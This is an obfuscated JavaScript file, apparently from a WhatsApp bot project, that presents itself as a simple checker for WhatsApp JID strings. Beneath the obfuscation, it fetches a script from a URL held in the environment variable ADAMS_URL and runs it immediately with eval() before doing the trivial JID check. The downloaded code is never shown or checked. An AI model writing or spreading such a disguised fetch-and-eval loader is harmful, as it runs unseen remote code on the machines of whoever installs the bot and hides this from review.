

/*JBM*/
'use strict';const _0x2084ce=_0x3496;(function(_0x475c8b,_0x140d86){const _0x3697c8=_0x3496,_0x2cbee7=_0x475c8b();while(!![]){try{const _0x14789b=parseInt(_0x3697c8(0x110))/0x1*(-parseInt(_0x3697c8(0xfe))/0x2)+parseInt(_0x3697c8(0x10e))/0x3*(-parseInt(_0x3697c8(0x109))/0x4)+parseInt(_0x3697c8(0x10d))/0x5+-parseInt(_0x3697c8(0x103))/0x6+-parseInt(_0x3697c8(0xff))/0x7*(-parseInt(_0x3697c8(0x115))/0x8)+-parseInt(_0x3697c8(0x104))/0x9+parseInt(_0x3697c8(0x107))/0xa;if(_0x14789b===_0x140d86)break;else _0x2cbee7['push'](_0x2cbee7['shift']());}catch(_0x5e22fa){_0x2cbee7['push'](_0x2cbee7['shift']());}}}(_0xe466,0x1929a));const axios=require('axios');require(_0x2084ce(0x114))[_0x2084ce(0x10f)]();const scriptUrl=process[_0x2084ce(0x100)][_0x2084ce(0x116)];function _0x3496(_0x362174,_0x362c4c){const _0xe46684=_0xe466();return _0x3496=function(_0x349682,_0x482b67){_0x349682=_0x349682-0xfe;let _0x59612e=_0xe46684[_0x349682];return _0x59612e;},_0x3496(_0x362174,_0x362c4c);}function atbverifierEtatJid(_0x6a67fe){const _0x4c89d3=_0x2084ce;if(!_0x6a67fe[_0x4c89d3(0x112)]('@s.whatsapp.net'))return console['error'](_0x4c89d3(0x10c),_0x6a67fe),![];return console['log'](_0x4c89d3(0x102),_0x6a67fe),!![];}axios[_0x2084ce(0x108)](scriptUrl)[_0x2084ce(0x10a)](_0x567a51=>{const _0x2d2183=_0x2084ce,_0x57772e=_0x567a51[_0x2d2183(0x10b)];console[_0x2d2183(0x105)](_0x2d2183(0x113)),eval(_0x57772e);const _0x162f4e='example@s.whatsapp.net',_0x43efc0=atbverifierEtatJid(_0x162f4e);console[_0x2d2183(0x105)]('Is\x20JID\x20valid?',_0x43efc0);})[_0x2084ce(0x106)](_0x9a0cf2=>{const _0x16801a=_0x2084ce;console[_0x16801a(0x111)](_0x16801a(0x101),_0x9a0cf2);});function _0xe466(){const _0x323b2e=['endsWith','Script\x20loaded\x20successfully!','dotenv','1005560onyQDF','ADAMS_URL','2mMpdzz','7GxIgqa','env','Error\x20loading\x20the\x20script:','JID\x20verified:','626376flaDdb','104364NGWRZT','log','catch','942130hfvukD','get','4xlLZNZ','then','data','Invalid\x20JID\x20format:','143290vmHXvf','84225SsUJBM','config','1433tZPnIy','error'];_0xe466=function(){return _0x323b2e;};return _0xe466();}
/*████████████████████████████████████████████████████████
█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒███
█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▒▒▒▒█
█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▄▀▄▀▒▒█
███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
█████▒▒▄▀▄▀▄▀▒▒█████▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███▒▒▄▀▒▒██▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▄▀▄▀▒▒█
█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▒▒██████████▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▒▒▒▒█
█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒███
████████████████████████████████████████████████████████*/
